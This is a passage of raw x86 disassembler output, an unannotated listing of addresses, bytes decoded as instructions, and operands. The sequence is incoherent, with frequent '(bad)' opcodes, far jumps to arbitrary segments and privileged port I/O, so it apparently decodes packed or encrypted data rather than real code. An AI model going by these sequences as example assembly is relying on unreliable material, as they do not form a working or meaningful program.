  419f89:	sbb    BYTE PTR [esi+0xf2c4016],dh
  419f8f:	int    0xfe
  419f91:	xchg   BYTE PTR [ebp+0xff0152d],bl
  419f97:	jmp    0x14e2:0x2a654009
  419f9e:	scas   eax,DWORD PTR es:[edi]
  419f9f:	ror    DWORD PTR [ebx],cl
  419fa1:	jmp    0x419f4c
  419fa3:	xchg   ecx,eax
  419fa4:	push   esi
  419fa5:	and    al,0xee
  419fa7:	pop    edi
  419fa8:	adc    esp,ebx
  419faa:	test   al,0xac
  419fac:	pop    edx
  419fad:	inc    edi
  419fae:	in     al,0x18
  419fb0:	popf   
  419fb1:	fcomp  DWORD PTR [ecx]
  419fb3:	sbb    ebp,ecx
  419fb5:	out    dx,eax
  419fb6:	fistp  WORD PTR [ecx]
  419fb8:	xor    cl,ah
  419fba:	xchg   esi,eax
  419fbb:	in     al,dx
  419fbc:	and    eax,0x51e2e9cf
  419fc1:	adc    al,ah
  419fc3:	mov    dh,0xc7
  419fc5:	pop    edx
  419fc6:	loop   0x419f94
  419fc8:	loopne 0x419fa7
  419fca:	push   ebx
  419fcb:	pop    edx
  419fcc:	lods   eax,DWORD PTR ds:[esi]
  419fcd:	aas    
  419fce:	dec    ebp
  419fcf:	mov    al,ds:0x9a36026d
  419fd4:	lock shl BYTE PTR [eax+0x5e40e948],cl
  419fdb:	push   es
  419fdc:	lods   eax,DWORD PTR ds:[esi]
  419fdd:	ins    DWORD PTR es:[edi],dx
  419fde:	sub    DWORD PTR [edx],edi
  419fe0:	sub    esp,ebx
  419fe2:	push   edi
  419fe3:	daa    
  419fe4:	xchg   DWORD PTR [edi-0x6b],edx
  419fe7:	jg     0x419fbc
  419fe9:	jge    0x41a03f
  419feb:	xchg   ebx,eax
  419fec:	ins    BYTE PTR es:[edi],dx
  419fed:	imul   ecx,DWORD PTR [eax-0x3f],0xc7cbb84a
  419ff4:	add    BYTE PTR [ecx-0x22c9f07f],al
  419ffa:	cmp    eax,0x8c477ddd
  419fff:	ror    DWORD PTR [ecx+0xd],1
  41a002:	mov    ds,WORD PTR [edi-0x6883d254]
  41a008:	push   edx
  41a009:	ds pop esi
  41a00b:	adc    al,ch
  41a00d:	test   ebp,0xaf8c58ce
  41a013:	ror    BYTE PTR [ecx],cl
  41a015:	xchg   esi,eax
  41a016:	pop    eax
  41a017:	mov    bh,0x30
  41a019:	cld    
  41a01a:	das    
  41a01b:	fdiv   st,st(3)
  41a01d:	(bad)  
  41a01e:	pop    ebp
  41a01f:	inc    ebp
  41a020:	(bad)  
  41a021:	pop    ebp
  41a022:	inc    ebp
  41a023:	retw   
  41a025:	and    edi,esi
  41a027:	mov    ebp,0xf8bff898
  41a02c:	mov    al,ds:0x3d1038d5
  41a031:	je     0x419fdc
  41a033:	pushf  
  41a034:	xchg   BYTE PTR [eax-0xe],cl
  41a037:	or     al,0x37
  41a039:	out    0xb6,al
  41a03b:	fs and edx,ecx
  41a03e:	mov    esp,0x7b9fd02c
  41a043:	xchg   ebx,eax
  41a044:	sahf   
  41a045:	mov    ebx,edi
  41a047:	inc    ebx
  41a048:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a049:	mov    esi,0xa2b07c58
  41a04e:	sahf   
  41a04f:	and    ebx,DWORD PTR [ecx+0x7]
  41a052:	jg     0x41a096
  41a054:	stos   BYTE PTR es:[edi],al
  41a055:	jne    0x41a00f
  41a057:	sub    bl,BYTE PTR [ebp-0x109f46fb]
  41a05d:	sbb    al,BYTE PTR [ebx]
  41a05f:	into   
  41a060:	das    
  41a061:	sti    
  41a062:	or     cl,BYTE PTR [ecx-0x6ea0c79]
  41a068:	rcr    BYTE PTR [edi],cl
  41a06a:	inc    edi
  41a06b:	xlat   BYTE PTR ds:[ebx]
  41a06c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a06d:	mov    esp,0x3e84f9b4
  41a072:	cmc    
  41a073:	mov    WORD PTR [esi+0x3ec45b8f],ss
  41a079:	cdq    
  41a07a:	and    al,0xd6
  41a07c:	push   ss
  41a07d:	test   DWORD PTR [ebp-0x5fb35266],ecx
  41a083:	arpl   WORD PTR ds:0x10bb489c,di
  41a089:	mov    dh,0xa1
  41a08b:	inc    ebp
  41a08c:	dec    ecx
  41a08d:	xchg   esi,eax
  41a08e:	push   esp
  41a08f:	mov    ebp,0x27dadd3b
  41a094:	adc    ebp,DWORD PTR [ecx-0x25]
  41a097:	ds hlt 
  41a099:	xchg   DWORD PTR [ecx-0x77],ebp
  41a09c:	aam    0x38
  41a09e:	mov    esp,0x92c05e5e
  41a0a3:	and    eax,0xcb74075a
  41a0a8:	push   ebp
  41a0a9:	push   edx
  41a0aa:	(bad)  [ebx+0x26]
  41a0ad:	int3   
  41a0ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0af:	ret    
  41a0b0:	xchg   BYTE PTR [eax+esi*2+0x37],al
  41a0b4:	ins    DWORD PTR es:[edi],dx
  41a0b5:	lds    ebp,FWORD PTR [ebx+0x32c44bf8]
  41a0bb:	shl    BYTE PTR [ebx-0x3c9fc743],1
  41a0c1:	stos   BYTE PTR es:[edi],al
  41a0c2:	push   es
  41a0c3:	js     0x41a04f
  41a0c5:	sub    ebx,DWORD PTR [ebx]
  41a0c7:	and    al,0x2a
  41a0c9:	xor    al,0xdf
  41a0cb:	fidivr DWORD PTR [ebp+edx*2-0x688b70ec]
  41a0d2:	js     0x41a146
  41a0d4:	fdivr  st(5),st
  41a0d6:	fisubr WORD PTR [ebx+ebx*2]
  41a0d9:	mov    al,ds:0x76ef8b42
  41a0de:	jl     0x41a07a
  41a0e0:	inc    eax
  41a0e1:	inc    eax
  41a0e2:	sub    eax,0x62f3d736
  41a0e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0e8:	pusha  
  41a0e9:	xchg   BYTE PTR [ebx-0x161ff550],al
  41a0ef:	push   eax
  41a0f0:	pushf  
  41a0f1:	lds    ecx,FWORD PTR [esi+eiz*2-0x1e179641]
  41a0f8:	(bad)  
  41a0f9:	mov    fs,WORD PTR [ebp-0x55]
  41a0fc:	mov    ds:0xc812668c,eax
  41a101:	ror    BYTE PTR [edx-0x11f89915],0x25
  41a108:	mov    WORD PTR [eax-0x4641f94d],ds
  41a10e:	push   ds
  41a10f:	(bad)  
  41a110:	imul   ecx,DWORD PTR [edi+0x65],0x24
  41a114:	ins    DWORD PTR es:[edi],dx
  41a115:	pop    es
  41a116:	push   ss
  41a117:	pushf  
  41a118:	in     eax,dx
  41a119:	adc    BYTE PTR [edx],dh
  41a11b:	sbb    al,0xce
  41a11d:	dec    ebp
  41a11e:	xor    ch,BYTE PTR [edx]
  41a120:	inc    esi
  41a121:	call   FWORD PTR [ecx+0x2d]
  41a124:	mov    ds:0x7c4d862e,al
  41a129:	mov    ecx,0x6f8109aa
  41a12e:	pop    edx
  41a12f:	xchg   ebx,eax
  41a130:	icebp  
  41a131:	dec    esi
  41a132:	repnz dec esi
  41a134:	mov    ch,0xcd
  41a136:	cmp    al,BYTE PTR ds:0x97886419
  41a13c:	test   eax,0x5f4a7c2b
  41a141:	mov    ebp,?
  41a143:	mov    al,0x62
  41a145:	retf   
  41a146:	xchg   edx,eax
  41a147:	in     eax,0x10
  41a149:	ss mov dl,0x2a
  41a14c:	hlt    
  41a14d:	outs   dx,DWORD PTR ds:[esi]
  41a14e:	mov    WORD PTR [edi+0x2ae0d855],gs
  41a154:	iret   
  41a155:	push   esp
  41a156:	out    0x1d,al
  41a158:	xchg   ebp,eax
  41a159:	(bad)  [eax]
  41a15b:	mov    bh,BYTE PTR [edx]
  41a15d:	push   edx
  41a15e:	ret    
  41a15f:	mov    ds:0x450957c4,eax
  41a164:	adc    DWORD PTR [eax-0x40],eax
  41a167:	popf   
  41a168:	inc    ebp
  41a169:	sub    dl,dl
  41a16b:	shr    BYTE PTR [eax+ebp*4-0x2bbf22db],0xa9
  41a173:	bnd jns 0x41a1e2
  41a176:	inc    ebx
  41a177:	sbb    DWORD PTR [ecx-0x76fa8a17],edx
  41a17d:	cmp    DWORD PTR [edx],eax
  41a17f:	mov    dl,0x75
  41a181:	mov    ah,0x55
  41a183:	mov    BYTE PTR [esi+0x4af22969],bh
  41a189:	popa   
  41a18a:	daa    
  41a18b:	das    
  41a18c:	xchg   ebp,eax
  41a18d:	iret   
  41a18e:	adc    eax,0xe376399a
  41a193:	(bad)  
  41a194:	push   cs
  41a195:	xchg   edx,eax
  41a196:	ds lock sub cl,dl
  41a19a:	push   esi
  41a19b:	pusha  
  41a19c:	mov    ah,0x12
  41a19e:	inc    esi
  41a19f:	mov    bh,0xd3
  41a1a1:	jno    0x41a16f
  41a1a3:	push   0xffffffb2
  41a1a5:	mov    ebx,0xb7b3d6fb
  41a1aa:	imul   edx,DWORD PTR [edx],0x64e52f8a
  41a1b0:	push   0xfffffffc
  41a1b2:	inc    esi
  41a1b3:	icebp  
  41a1b4:	jge    0x41a195
  41a1b6:	adc    al,0x9
  41a1b8:	mov    eax,ebp
  41a1ba:	mov    cl,0xd4
  41a1bc:	and    BYTE PTR [ecx-0x5a],0xa7
  41a1c0:	out    0x91,al
  41a1c2:	sar    BYTE PTR [edi+0x17],1
  41a1c5:	push   ds
  41a1c6:	enter  0x3df9,0x50
  41a1ca:	mov    al,0xb9
  41a1cc:	std    
  41a1cd:	inc    ecx
  41a1ce:	xor    ebp,esi
  41a1d0:	sbb    BYTE PTR [ecx],dh
  41a1d2:	cwde   
  41a1d3:	nop
  41a1d4:	inc    esi
  41a1d5:	mov    ch,0xb7
  41a1d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1d8:	xchg   DWORD PTR [esp+edi*8],ebp
  41a1db:	das    
  41a1dc:	fadd   QWORD PTR [edx+ecx*1]
  41a1df:	into   
  41a1e0:	push   edi
  41a1e1:	or     ebx,edx
  41a1e3:	pop    es
  41a1e4:	mov    cl,0x2b
  41a1e6:	fstp   TBYTE PTR [esi]
  41a1e8:	outs   dx,DWORD PTR ds:[esi]
  41a1e9:	call   FWORD PTR [ecx+eax*1+0x27]
  41a1ed:	xor    ch,BYTE PTR [edi]
  41a1ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a1f0:	enter  0x8e23,0xe9
  41a1f4:	iret   
  41a1f5:	shl    BYTE PTR [esi+0x63],0x61
  41a1f9:	mov    dh,BYTE PTR [esi-0x2e]
  41a1fc:	retf   
  41a1fd:	arpl   WORD PTR [edi],cx
  41a1ff:	in     al,dx
  41a200:	cwde   
  41a201:	adc    DWORD PTR [ebx-0x7],esp
  41a204:	dec    ecx
  41a205:	add    ch,bl
  41a207:	(bad)  
  41a208:	pusha  
  41a209:	xchg   esp,eax
  41a20a:	xchg   edx,eax
  41a20b:	jmp    0xcc53:0xfc6669
  41a212:	mov    ebx,0xfd6bd784
  41a217:	dec    ebx
  41a218:	pop    edi
  41a219:	in     eax,dx
  41a21a:	push   esp
  41a21b:	dec    eax
  41a21c:	mov    dl,0x4c
  41a21e:	or     ebp,DWORD PTR [edi]
  41a220:	lahf   
  41a221:	test   al,0x40
  41a223:	shr    DWORD PTR [esi-0x80],cl
  41a226:	out    0xba,eax
  41a228:	sbb    eax,0xc914314d
  41a22d:	sub    BYTE PTR [ebp+0x62],cl
  41a230:	inc    esp
  41a231:	outs   dx,BYTE PTR ds:[esi]
  41a232:	and    al,0xb5
  41a234:	int    0x78
  41a236:	test   DWORD PTR [esi-0x40ca8d32],edi
  41a23c:	xchg   ecx,eax
  41a23d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a23e:	xor    ebp,DWORD PTR [edx+0x5bed5ad4]
  41a244:	xor    DWORD PTR [ecx],esp
  41a246:	pop    ss
  41a247:	push   0x18
  41a249:	shr    DWORD PTR [ecx+0x2b96a12c],0x37
  41a250:	das    
  41a251:	inc    BYTE PTR [ebp+0x2699fd4a]
  41a257:	adc    cl,BYTE PTR [ebp-0x50b96311]
  41a25d:	sub    al,0x17
  41a25f:	mov    DWORD PTR [eax+0x56f5f24f],eax
  41a265:	(bad)
  41a268:	mov    eax,0x79cbff4b
  41a26d:	int    0x1a
  41a26f:	ret    0xd148
  41a272:	jmp    0x41a222
  41a274:	cmp    DWORD PTR [esi-0x7d3f0c4b],ebx
  41a27a:	dec    ecx
  41a27b:	fs jno 0x41a265
  41a27e:	pop    esi
  41a27f:	push   0x6ac4efb2
  41a284:	mov    esi,ebx
  41a286:	loopne 0x41a23e
  41a288:	das    
  41a289:	fiadd  DWORD PTR [ebp-0x47]
  41a28c:	mov    bl,0x9e
  41a28e:	mov    ecx,0xd093846c
  41a293:	mov    esi,0x2cf38c9f
  41a298:	push   edx
  41a299:	add    eax,0xfb0759ea
  41a29e:	push   eax
  41a29f:	dec    esp
  41a2a0:	fbld   TBYTE PTR [ebx+0x7e]
  41a2a3:	sbb    eax,0x7bf0d7c
  41a2a8:	add    BYTE PTR [ebx],0x29
  41a2ab:	xchg   BYTE PTR [ebp+edx*1-0x56],ch
  41a2af:	test   ecx,0x647c4fa1
  41a2b5:	xor    BYTE PTR [edx+0x679c24cf],bh
  41a2bb:	repz jmp 0x41a325
  41a2be:	pop    esi
  41a2bf:	mov    BYTE PTR [eax+eax*8+0x43f94da2],ch
  41a2c6:	pop    ecx
  41a2c7:	ss ret 0x5981
  41a2cb:	stos   BYTE PTR es:[edi],al
  41a2cc:	ins    DWORD PTR es:[edi],dx
  41a2cd:	push   0xeaf9dc78
  41a2d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2d3:	and    BYTE PTR [edx],al
  41a2d5:	and    BYTE PTR [eax],ch
  41a2d7:	cmp    bl,cl
  41a2d9:	ds pusha 
  41a2db:	mov    eax,DWORD PTR [ebx-0x2fc01977]
  41a2e1:	aas    
  41a2e2:	mov    bh,0x80
  41a2e4:	pop    ds
  41a2e5:	ror    dl,1
  41a2e7:	xlat   BYTE PTR ds:[ebx]
  41a2e8:	sbb    bl,BYTE PTR [esi+eiz*2+0xf14fc17]
  41a2ef:	xor    edx,eax
  41a2f1:	out    0xfe,al
  41a2f3:	xor    ecx,DWORD PTR [esp+edi*2+0x2f]
  41a2f7:	pop    ecx
  41a2f8:	mov    ds:0xb752f0ab,al
  41a2fd:	sbb    dh,BYTE PTR [esi-0x4d]
  41a300:	sbb    DWORD PTR [ebx],esp
  41a302:	inc    esi
  41a303:	mov    esp,0xf82d9140
  41a308:	rcl    BYTE PTR ds:0xcfce7fd9,cl
  41a30e:	mov    edx,0xed3bffdc
  41a313:	neg    DWORD PTR [edi-0x25]
  41a316:	mov    al,ds:0xd99a2944
  41a31b:	cld    
  41a31c:	(bad)  
  41a31d:	mov    dl,0x21
  41a31f:	loope  0x41a2bf
  41a321:	fdivr  DWORD PTR [edi-0x481095d9]
  41a327:	lahf   
  41a328:	lds    ebp,FWORD PTR [eax+eiz*2+0xc]
  41a32c:	add    bh,BYTE PTR [ecx+0x6c]
  41a32f:	adc    BYTE PTR [eax-0x50],ch
  41a332:	push   ecx
  41a333:	mov    ds:0x55710906,eax
  41a338:	sbb    ebx,edx
  41a33a:	arpl   WORD PTR [ebp+esi*2-0x726fb461],sp
  41a341:	xor    al,0xe9
  41a343:	cmp    al,bh
  41a345:	cmp    ecx,DWORD PTR [ecx+edx*2]
  41a348:	call   0xd7d8:0xb877352d
  41a34f:	iret   
  41a350:	fdivr  DWORD PTR ss:[ecx-0x4c31a9dd]
  41a357:	fxch   st(2)
  41a359:	jno    0x41a3ba
  41a35b:	adc    eax,0x9dbf9734
  41a360:	sbb    ebp,DWORD PTR [ebp-0x4b646873]
  41a366:	xchg   ebp,eax
  41a367:	cmc    
  41a368:	enter  0xbb3c,0x4b
  41a36c:	shl    bh,cl
  41a36e:	cdq    
  41a36f:	(bad)  
  41a370:	ficom  DWORD PTR [eax+0x63]
  41a373:	mov    dl,0x3a
  41a375:	test   al,0x4f
  41a377:	dec    esi
  41a378:	sub    DWORD PTR [ebx+0x29fdc42e],ebx
  41a37e:	fld    QWORD PTR [ebp-0x7]
  41a381:	fidivr DWORD PTR [edi+0x7e]
  41a384:	push   ss
  41a385:	jmp    0x4a66:0xdb23b421
  41a38c:	xor    eax,0xce9bac07
  41a391:	ds sub al,0xff
  41a394:	in     al,0x58
  41a396:	add    eax,0x4698bb45
  41a39b:	mov    ah,0x63
  41a39d:	xor    esi,DWORD PTR [ebp+ecx*4+0x2d13bed5]
  41a3a4:	xor    al,0x5e
  41a3a6:	dec    ebx
  41a3a7:	popa   
  41a3a8:	arpl   WORD PTR [eax],bp
  41a3aa:	cmp    dh,cl
  41a3ac:	leave  
  41a3ad:	pop    edi
  41a3af:	(bad)  
  41a3b0:	push   cs
  41a3b1:	mov    ds:0x76c71d0,eax
  41a3b6:	jbe    0x41a3d5
  41a3b8:	scas   al,BYTE PTR es:[edi]
  41a3b9:	pop    esp
  41a3ba:	pop    ds
  41a3bb:	les    esp,FWORD PTR [edi+0x7d]
  41a3be:	xchg   ecx,eax
  41a3bf:	(bad)  
  41a3c0:	and    edx,ebp
  41a3c2:	adc    ecx,DWORD PTR [ecx+0x5caf472c]
  41a3c8:	in     al,dx
  41a3c9:	pop    eax
  41a3ca:	inc    eax
  41a3cb:	inc    eax
  41a3cc:	(bad)  
  41a3cd:	stc    
  41a3ce:	iret   
  41a3cf:	pop    ebx
  41a3d0:	out    0xe6,eax
  41a3d2:	xchg   ebp,eax
  41a3d3:	test   BYTE PTR [eax],ah
  41a3d5:	ficomp DWORD PTR [eax-0x19]
  41a3d8:	(bad)  
  41a3d9:	mov    edx,0xbd904f0
  41a3de:	cwde   
  41a3df:	js     0x41a3f4
  41a3e1:	jb     0x41a368
  41a3e3:	mov    esp,0x3054ab4a
  41a3e8:	ins    BYTE PTR es:[edi],dx
  41a3e9:	sub    ecx,esp
  41a3eb:	aad    0xe2
  41a3ed:	xor    eax,0x4d89bd23
  41a3f2:	inc    edx
  41a3f3:	daa    
  41a3f4:	mov    esi,0xc50bd649
  41a3f9:	cmp    ch,bl
  41a3fb:	dec    eax
  41a3fc:	xchg   BYTE PTR [esp+edi*2+0x6698d363],al
  41a403:	out    0xed,eax
  41a405:	jns    0x41a47e
  41a407:	cmp    al,0xb9
  41a409:	cs or  eax,0x34c0809b
  41a40f:	mov    ebx,ds
  41a411:	lods   al,BYTE PTR ds:[esi]
  41a412:	mov    fs,WORD PTR [edi]
  41a414:	xchg   DWORD PTR ds:0xd8d2651b,ecx
  41a41a:	mov    ecx,0xaa869acb
  41a41f:	or     BYTE PTR [eax+0x3194ce88],ah
  41a425:	fsubr  DWORD PTR [esi+0x24132483]
  41a42b:	add    eax,0x305a9bd5
  41a430:	mov    edi,0x1b603aab
  41a435:	rcl    DWORD PTR [edi+edi*8-0x2c1fc7de],1
  41a43c:	test   DWORD PTR [edx],edi
  41a43e:	lods   eax,DWORD PTR ds:[esi]
  41a43f:	fnstenv [ecx]
  41a441:	outs   dx,BYTE PTR ds:[esi]
  41a442:	cli    
  41a443:	daa    
  41a444:	leave  
  41a445:	sbb    esi,esi
  41a447:	xchg   edi,eax
  41a448:	std    
  41a449:	fs dec cx
  41a44c:	in     eax,0xcc
  41a44e:	out    0x1b,eax
  41a450:	call   0x19d8:0xcd4cfb27
  41a457:	mov    esp,0xe810f0ab
  41a45c:	xchg   DWORD PTR [ebp+0x4a7490a0],esp
  41a462:	dec    esp
  41a463:	clc    
  41a464:	rcl    BYTE PTR [esi],cl
  41a466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a467:	inc    edi
  41a468:	and    ah,BYTE PTR [ebx-0x42034523]
  41a46e:	cld    
  41a46f:	arpl   WORD PTR [eax-0x4ff80dab],ax
  41a475:	inc    edx
  41a476:	not    DWORD PTR ss:[edi]
  41a479:	xor    bh,bh
  41a47b:	or     ah,bl
  41a47d:	sahf   
  41a47e:	iret   
  41a47f:	cwde   
  41a480:	dec    ebx
  41a481:	scas   eax,DWORD PTR es:[edi]
  41a482:	rcl    dl,1
  41a484:	icebp  
  41a485:	mov    dl,0x63
  41a487:	add    al,0xff
  41a489:	push   ss
  41a48a:	nop
  41a48b:	fist   WORD PTR [ebp-0x3024140e]
  41a491:	jo     0x41a4ed
  41a493:	jge    0x41a44e
  41a495:	stos   DWORD PTR es:[edi],eax
  41a496:	test   BYTE PTR [edi+0x23bfea39],dh
  41a49c:	dec    ecx
  41a49d:	push   cs
  41a49e:	(bad)  
  41a49f:	cmc    
  41a4a0:	fidiv  DWORD PTR [ebp+edx*4-0x3f4c8dc3]
  41a4a7:	mov    ecx,edi
  41a4a9:	sub    al,0xa1
  41a4ab:	rol    DWORD PTR [eax+eax*8-0x46],cl
  41a4af:	mov    ebp,0x94331190
  41a4b4:	int3   
  41a4b5:	xchg   esp,eax
  41a4b6:	sbb    edx,edi
  41a4b8:	scas   eax,DWORD PTR es:[edi]
  41a4b9:	rcr    DWORD PTR [ebx],cl
  41a4bb:	rcr    DWORD PTR [esi],0xf5
  41a4be:	pop    esp
  41a4bf:	xlat   BYTE PTR ds:[ebx]
  41a4c0:	cmp    bl,BYTE PTR [edi]
  41a4c2:	jecxz  0x41a4ac
  41a4c4:	retf   0xbe3c
  41a4c7:	dec    ebx
  41a4c8:	shl    ebx,0x66
  41a4cb:	mov    ebx,0x100cf10d
  41a4d0:	dec    esi
  41a4d1:	dec    ebx
  41a4d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4d3:	leave  
  41a4d4:	fs scas al,BYTE PTR es:[edi]
  41a4d6:	les    eax,FWORD PTR [ecx+0x24]
  41a4d9:	mov    ds:0x2a6c9a4b,al
  41a4de:	out    0xd5,al
  41a4e0:	cwde   
  41a4e1:	jmp    0x5b2f:0xc157f305
  41a4e8:	jno    0x41a516
  41a4ea:	aad    0x5c
  41a4ec:	ret    0x6654
  41a4ef:	outs   dx,DWORD PTR ds:[esi]
  41a4f0:	shl    DWORD PTR [eax-0x7270e72a],1
  41a4f6:	(bad)  
  41a4f8:	out    dx,eax
  41a4f9:	mov    ebp,0xe0839eb0
  41a4fe:	jnp    0x41a511
  41a500:	xchg   eax,ebp
  41a502:	pop    edx
  41a503:	cli    
  41a504:	push   edx
  41a505:	mov    edi,0xf631c7d2
  41a50a:	jbe    0x41a56a
  41a50c:	test   al,0xe5
  41a50e:	sbb    eax,0x235463c5
  41a513:	dec    ebx
  41a514:	inc    edx
  41a515:	xchg   esi,eax
  41a516:	js     0x41a57e
  41a518:	mov    ah,BYTE PTR [edx]
  41a51a:	mov    ebx,0x78b5ddf3
  41a51f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a520:	xchg   DWORD PTR [edi],ecx
  41a522:	inc    ecx
  41a523:	fsubp  st(3),st
  41a525:	outs   dx,BYTE PTR ds:[esi]
  41a526:	or     al,0x18
  41a528:	pop    eax
  41a529:	popf   
  41a52a:	repz adc BYTE PTR [ecx-0x793744af],0x98
  41a532:	xchg   esp,eax
  41a533:	test   DWORD PTR [ecx-0x2ec9dd26],0xf0b3b7d8
  41a53d:	fdivr  QWORD PTR fs:[ebx+0xe]
  41a541:	loop   0x41a4e4
  41a543:	fwait
  41a544:	les    ebx,FWORD PTR [ebx-0x24]
  41a547:	fisub  WORD PTR [edx-0xcdebe4]
  41a54d:	xchg   esi,eax
  41a54e:	sub    BYTE PTR [ebx],0xcb
  41a551:	mov    ebx,0x40351527
  41a556:	push   0xc
  41a558:	out    0xed,al
  41a55a:	retf   0xcdd9
  41a55d:	mov    eax,0x8c738921
  41a562:	or     bh,cl
  41a564:	inc    ebp
  41a565:	jns    0x41a5a8
  41a567:	push   ss
  41a568:	dec    esi
  41a569:	sbb    ch,al
  41a56b:	push   0xffffff91
  41a56d:	dec    edi
  41a56e:	jp     0x41a5c3
  41a570:	mov    BYTE PTR fs:[eax+0x65583793],cl
  41a577:	sbb    ebp,DWORD PTR [edi]
  41a579:	inc    ecx
  41a57a:	xor    eax,0x9ad01e75
  41a57f:	cli    
  41a580:	lods   eax,DWORD PTR ds:[esi]
  41a581:	ja     0x41a511
  41a583:	call   0x95f8:0x3c8dcf6a
  41a58a:	std    
  41a58b:	sbb    al,BYTE PTR [eax-0x2a3b58b8]
  41a591:	mov    esp,0xb6e9a87d
  41a596:	sbb    bl,BYTE PTR [edi-0x11]
  41a599:	mov    BYTE PTR [ebx-0x5b695399],ah
  41a59f:	sub    al,0xe6
  41a5a1:	dec    ecx
  41a5a2:	inc    ebx
  41a5a3:	repnz mov dl,0x1c
  41a5a6:	cmp    DWORD PTR [eax-0x21],ebx
  41a5a9:	fild   WORD PTR gs:[eax+0xe]
  41a5ad:	xchg   edx,eax
  41a5ae:	jnp    0x41a544
  41a5b0:	ds xor ebp,eax
  41a5b3:	lods   eax,DWORD PTR ds:[esi]
  41a5b4:	lock inc BYTE PTR gs:[ebp+0x2b]
  41a5b9:	sub    edi,0x21
  41a5bc:	mov    ebp,DWORD PTR [esi+0x4fcdee13]
  41a5c2:	(bad)  
  41a5c3:	mov    ch,0x42
  41a5c5:	cmp    edi,DWORD PTR [edi-0x3b]
  41a5c8:	dec    ebp
  41a5c9:	and    bl,bh
  41a5cb:	repz cdq 
  41a5cd:	add    eax,0x5b6ea5e2
  41a5d2:	cmp    edx,DWORD PTR [ebp-0x601071e3]
  41a5d8:	add    eax,0x6c13425
  41a5dd:	sar    BYTE PTR [esi],1
  41a5df:	jo     0x41a64f
  41a5e1:	fwait
  41a5e2:	les    esp,FWORD PTR ds:0x60178c59
  41a5e8:	push   esi
  41a5e9:	scas   al,BYTE PTR es:[edi]
  41a5ea:	stos   DWORD PTR es:[edi],eax
  41a5eb:	nop
  41a5ec:	mov    ebp,DWORD PTR [ebp-0x1a7d6ac5]
  41a5f2:	cdq    
  41a5f3:	repnz clc 
  41a5f5:	lods   al,BYTE PTR ds:[esi]
  41a5f6:	mov    ah,ch
  41a5f8:	fs mov ebx,esi
  41a5fb:	xchg   DWORD PTR [ecx],eax
  41a5fd:	jo     0x41a66c
  41a5ff:	push   0xa6a3d008
  41a604:	test   DWORD PTR [ebx-0xa],eax
  41a607:	jno    0x41a617
  41a609:	fcomp  QWORD PTR [edi+0x2eb09ff]
  41a60f:	jb     0x41a643
  41a611:	das    
  41a612:	(bad)  
  41a614:	fstp   TBYTE PTR [eax]
  41a616:	push   ebx
  41a617:	cmp    eax,0xe84d811a
  41a61c:	(bad)  
  41a61d:	sub    BYTE PTR [ebp+0x1ce1d817],ah
  41a623:	sub    eax,0xfd1dc26c
  41a628:	icebp  
  41a629:	pop    esi
  41a62a:	cdq    
  41a62b:	mov    bl,0x7a
  41a62d:	push   edx
  41a62e:	ja     0x41a607
  41a630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a631:	mov    BYTE PTR [ebp+0x79a9736e],dl
  41a637:	(bad)  
  41a63a:	ja     0x41a606
  41a63c:	stos   DWORD PTR es:[edi],eax
  41a63d:	push   0x52
  41a63f:	pushf  
  41a640:	cwde   
  41a641:	lahf   
  41a642:	jnp    0x41a638
  41a644:	xlat   BYTE PTR ds:[ebx]
  41a645:	loop   0x41a664
  41a647:	lds    ecx,FWORD PTR [ebx]
  41a649:	mov    al,ds:0xb4f2a056
  41a64e:	xchg   BYTE PTR [ecx+0x6c952193],bh
  41a654:	mov    ebx,0xa5c28a21
  41a659:	jge    0x41a644
  41a65b:	sub    al,0x2f
  41a65d:	inc    esi
  41a65e:	mov    ds:0xb6567140,eax
  41a663:	pop    eax
  41a664:	aam    0xdd
  41a666:	add    esp,DWORD PTR [eax]
  41a668:	pop    es
  41a669:	stc    
  41a66a:	mov    fs,eax
  41a66c:	push   ebp
  41a66d:	pop    eax
  41a66e:	cmp    eax,0xf651b26a
  41a673:	cmp    BYTE PTR [esi-0x7c],bl
  41a676:	xor    eax,0x25e00e1c
  41a67b:	push   ds
  41a67c:	sbb    eax,0x385124fd
  41a681:	out    0xed,eax
  41a683:	adc    BYTE PTR [ecx+0x72],dh
  41a686:	(bad)  [edx-0x87e436e]
  41a68c:	repz push ebx
  41a68e:	fsub   DWORD PTR [esi]
  41a690:	jae    0x41a663
  41a692:	test   bh,bh
  41a694:	cmc    
  41a695:	xchg   edi,eax
  41a696:	jns    0x41a6aa
  41a698:	mov    bl,0xa9
  41a69a:	mov    ah,0x2d
  41a69c:	inc    edx
  41a69d:	cmp    bh,0x77
  41a6a0:	loope  0x41a6d0
  41a6a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6a3:	jp     0x41a6c5
  41a6a5:	(bad)  
  41a6a6:	cmp    DWORD PTR [esi-0x8a44e9c],eax
  41a6ac:	pop    esp
  41a6ad:	or     al,BYTE PTR [esi-0x4a]
  41a6b0:	ss push ecx
  41a6b2:	shr    DWORD PTR [ecx],0xef
  41a6b5:	push   ebx
  41a6b6:	in     eax,0xae
  41a6b8:	mov    cl,0xfc
  41a6ba:	xlat   BYTE PTR ds:[ebx]
  41a6bb:	mov    cl,0xa9
  41a6bd:	lods   eax,DWORD PTR ds:[esi]
  41a6be:	mov    cl,0x89
  41a6c0:	xchg   edi,eax
  41a6c1:	xchg   esp,eax
  41a6c2:	popf   
  41a6c3:	push   edx
  41a6c4:	sub    dl,ah
  41a6c6:	mov    ds:0xa3e7b02,al
  41a6cb:	add    al,BYTE PTR [eax-0x5e]
  41a6ce:	push   ebx
  41a6cf:	cs dec ebx
  41a6d1:	(bad)  
  41a6d2:	loop   0x41a728
  41a6d4:	and    dl,BYTE PTR [edx]
  41a6d6:	dec    eax
  41a6d7:	mov    ah,0x9f
  41a6d9:	cmp    BYTE PTR [edx+0x422628b9],bl
